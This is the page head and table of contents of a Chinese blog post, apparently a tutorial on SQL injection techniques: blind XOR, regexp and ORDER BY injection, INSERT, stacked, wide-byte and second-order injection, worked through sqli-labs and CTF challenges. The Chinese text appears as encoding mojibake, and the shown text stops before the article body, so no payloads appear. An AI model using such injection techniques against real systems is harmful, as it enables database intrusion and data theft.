<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ä¸¨greetdawnä¸¨"><meta name="copyright" content="ä¸¨greetdawnä¸¨"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>SQLæ³¨å…¥ä¸­çš„ç‚¹ç‚¹æ»´æ»´ | greetdawn's Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"www.greetdawn.top","root":"/","title":"ç¾¤å“¥çš„åšå®¢","version":"1.5.2","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"æœç´¢...","empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹: ${query}","hits":"æ‰¾åˆ° ${hits} æ¡ç»“æœ","hits_time":"æ‰¾åˆ° ${hits} æ¡ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=UA-121354150-1"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-121354150-1');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta property="og:type" content="article">
<meta property="og:title" content="SQLæ³¨å…¥ä¸­çš„ç‚¹ç‚¹æ»´æ»´">
<meta property="og:url" content="http://www.greetdawn.top/2021/02/01/web-security/sql-injection/sql-injection-advanced/index.html">
<meta property="og:site_name" content="greetdawn&#39;s Blog">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/5.jpg">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122163621.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122163812.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122164009.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122164141.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125104720.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125105745.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125110031.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125154937.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125155105.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125155204.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210126093916.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127112311.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133019.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127132939.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133432.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133521.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210128093143.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210128094918.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210128100811.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128104911961.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145525282.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145613197.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145657274.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145734590.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145837778.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128154554855.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161307478.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161402835.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161507494.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161756298.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128162804831.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128164413693.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180359265.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180506380.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180652574.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180652574.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150312508.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150415389.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150542009.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150618966.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150640389.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150840816.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150906850.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151053028.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151119696.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151124989.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151147487.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151215700.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151235080.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151249140.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151303856.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151316265.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128193107498.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128193219077.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129133636903.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129134724322.png">
<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129143131058.png">
<meta property="article:published_time" content="2021-02-01T02:44:14.000Z">
<meta property="article:modified_time" content="2021-02-01T02:50:35.694Z">
<meta property="article:author" content="ä¸¨greetdawnä¸¨">
<meta property="article:tag" content="sql-injection">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/5.jpg"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="æ–‡ç« ç›®å½•"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="ç«™ç‚¹æ¦‚è§ˆ"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ä¸¨greetdawnä¸¨"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="ä¸¨greetdawnä¸¨"><span class="site-author-status" title="ä¸æƒ³ä¸Šç­">ğŸ˜­</span></a><div class="site-author-name"><a href="/about/">ä¸¨greetdawnä¸¨</a></div><a class="site-name" href="/about/site.html">greetdawn's Blog</a><sub class="site-subtitle">The God love people</sub><div class="site-desciption">Love coding,Love life!</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="é¦–é¡µ"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="å½’æ¡£"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">46</span></a></div><div class="site-state-item"><a href="/categories/" title="åˆ†ç±»"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">14</span></a></div><div class="site-state-item"><a href="/tags/" title="æ ‡ç­¾"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">44</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ç•™è¨€æ¿"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://wpa.qq.com/msgrd?v=3&amp;uin=910426929&amp;site=qq&amp;menu=yes" title="QQ" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/greetdawn" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:953640552@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/" title="å¾®åš" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-weibo-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=372656460" title="ç½‘æ˜“äº‘éŸ³ä¹" target="_blank" style="color:#C10D0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/" title="çŸ¥ä¹" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/478304087" title="å“”å“©å“”å“©åŠ¨ç”»" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://t.me/" title="Telegram" target="_blank" style="color:#0088CC"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-telegram-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a><a class="links-item hty-icon-button" href="/girls/" title="å–œæ¬¢çš„å¥³å­©å­" style="color:hotpink"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-women-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%8A%80%E5%B7%A7"><span class="toc-number">1.</span> <span class="toc-text">ç›²æ³¨ä¸­çš„å¤šç§æŠ€å·§</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XOR%E7%9B%B2%E6%B3%A8-%E5%BC%82%E6%88%96%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.</span> <span class="toc-text">XORç›²æ³¨(å¼‚æˆ–ç›²æ³¨)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">åŸºæœ¬åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.2.</span> <span class="toc-text">é¢˜ç›®ç¯å¢ƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E8%A7%A3%E6%9E%90"><span class="toc-number">1.1.3.</span> <span class="toc-text">ä¾‹é¢˜è§£æ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#regexp-relike%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.</span> <span class="toc-text">regexp&#x2F;relikeç›²æ³¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">æ³¨å…¥åŸç†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#regexp%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">regexpåŸºæœ¬ç”¨æ³•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.2.3.</span> <span class="toc-text">ä½¿ç”¨åœºæ™¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlilab%E4%B8%AD%E7%AE%80%E5%8D%95%E5%9C%BA%E6%99%AF%E7%9A%84%E8%BF%90%E7%94%A8"><span class="toc-number">1.2.4.</span> <span class="toc-text">sqlilabä¸­ç®€å•åœºæ™¯çš„è¿ç”¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E5%AE%9E%E6%88%98"><span class="toc-number">1.2.5.</span> <span class="toc-text">ä¾‹é¢˜å®æˆ˜</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.</span> <span class="toc-text">order byç›²æ³¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#order-by-%E5%AD%90%E5%8F%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">order by å­å¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.3.2.</span> <span class="toc-text">åŸºç¡€çŸ¥è¯†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#order-by-%E7%9B%B2%E6%B3%A8%E6%A6%82%E5%BF%B5"><span class="toc-number">1.3.3.</span> <span class="toc-text">order by ç›²æ³¨æ¦‚å¿µ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#order-by%E5%B8%B8%E7%94%A8%E7%9B%B2%E6%B3%A8%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.3.4.</span> <span class="toc-text">order byå¸¸ç”¨ç›²æ³¨è¯­å¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlilab-less48"><span class="toc-number">1.3.5.</span> <span class="toc-text">sqlilab-less48</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#insert-into%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">insert intoæ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%AD%E5%8F%A5%E5%9F%BA%E7%A1%80"><span class="toc-number">2.1.</span> <span class="toc-text">è¯­å¥åŸºç¡€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95%E6%A0%BC%E5%BC%8F"><span class="toc-number">2.2.</span> <span class="toc-text">è¯­æ³•æ ¼å¼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%9F%E9%A2%98%E6%A1%88%E4%BE%8B"><span class="toc-number">2.3.</span> <span class="toc-text">çœŸé¢˜æ¡ˆä¾‹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81"><span class="toc-number">2.3.1.</span> <span class="toc-text">é¢˜ç›®æºç </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.3.2.</span> <span class="toc-text">é¢˜ç›®åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%82%A8%E5%A4%87"><span class="toc-number">2.3.3.</span> <span class="toc-text">çŸ¥è¯†å‚¨å¤‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.4.</span> <span class="toc-text">æ¼æ´åˆ©ç”¨</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">å †å æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">å †å æ³¨å…¥åŸç†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">å †å æ³¨å…¥çš„ä¼˜ç¼ºç‚¹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8-sqlilab-less38"><span class="toc-number">3.3.</span> <span class="toc-text">å †å æ³¨å…¥çš„åˆ©ç”¨(sqlilab-less38)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%9F%E9%A2%98%E7%8E%AF%E5%A2%83%E5%A4%8D%E7%8E%B0-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">3.4.</span> <span class="toc-text">çœŸé¢˜ç¯å¢ƒå¤ç°(å¼ºç½‘æ¯2019-éšä¾¿æ³¨)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.4.1.</span> <span class="toc-text">ç¯å¢ƒå¤ç°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="toc-number">3.4.2.</span> <span class="toc-text">é¢˜ç›®åˆ†æ</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">å®½å­—èŠ‚æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-number">4.1.</span> <span class="toc-text">å®½å­—èŠ‚æ³¨å…¥çš„æ¦‚å¿µ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">4.2.</span> <span class="toc-text">å®½å­—èŠ‚æ³¨å…¥çš„åŸç†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.3.</span> <span class="toc-text">å®½å­—èŠ‚æ³¨å…¥å‰ææ¡ä»¶</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8-sqlilab-less38"><span class="toc-number">4.4.</span> <span class="toc-text">å®½å­—èŠ‚æ³¨å…¥çš„åˆ©ç”¨(sqlilab-less38)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">äºŒæ¬¡æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%92%8C%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">5.1.</span> <span class="toc-text">æ³¨å…¥å’ŒäºŒæ¬¡æ³¨å…¥çš„åŒºåˆ«</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">5.2.</span> <span class="toc-text">äºŒæ¬¡æ³¨å…¥çš„åŸç†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">5.3.</span> <span class="toc-text">äºŒæ¬¡æ³¨å…¥çš„åˆ©ç”¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%9F%E9%A2%98%E7%8E%AF%E5%A2%83%E5%A4%8D%E7%8E%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish"><span class="toc-number">5.4.</span> <span class="toc-text">çœŸé¢˜ç¯å¢ƒå¤ç°(ç½‘é¼æ¯2018-Unfinish)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0"><span class="toc-number">5.4.1.</span> <span class="toc-text">é¢˜ç›®å¤ç°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2"><span class="toc-number">5.4.2.</span> <span class="toc-text">é¢˜ç›®åˆ†æ</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://www.greetdawn.top/2021/02/01/web-security/sql-injection/sql-injection-advanced/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ä¸¨greetdawnä¸¨"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="greetdawn's Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">SQLæ³¨å…¥ä¸­çš„ç‚¹ç‚¹æ»´æ»´<a class="post-edit-link" href="https://github.com/greetdawn/_posts/web-security/sql-injection/sql-injection-advanced.md" target="_blank" title="ç¼–è¾‘" rel="noopener"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-edit-line"></use></svg></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="åˆ›å»ºæ—¶é—´ï¼š2021-02-01 10:44:14" itemprop="dateCreated datePublished" datetime="2021-02-01T10:44:14+08:00">2021-02-01</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="æœ¬æ–‡å­—æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="æœ¬æ–‡å­—æ•°">6.8k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ—¶é•¿"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="é˜…è¯»æ—¶é•¿">30m</span></span></span><span class="leancloud_visitors" id="/2021/02/01/web-security/sql-injection/sql-injection-advanced/" data-flag-title="SQLæ³¨å…¥ä¸­çš„ç‚¹ç‚¹æ»´æ»´"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ¬¡æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/web%E5%AE%89%E5%85%A8/" style="--text-color:#F4DF4F" itemprop="url" rel="index"><span itemprop="text">webå®‰å…¨</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/sql-injection/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" 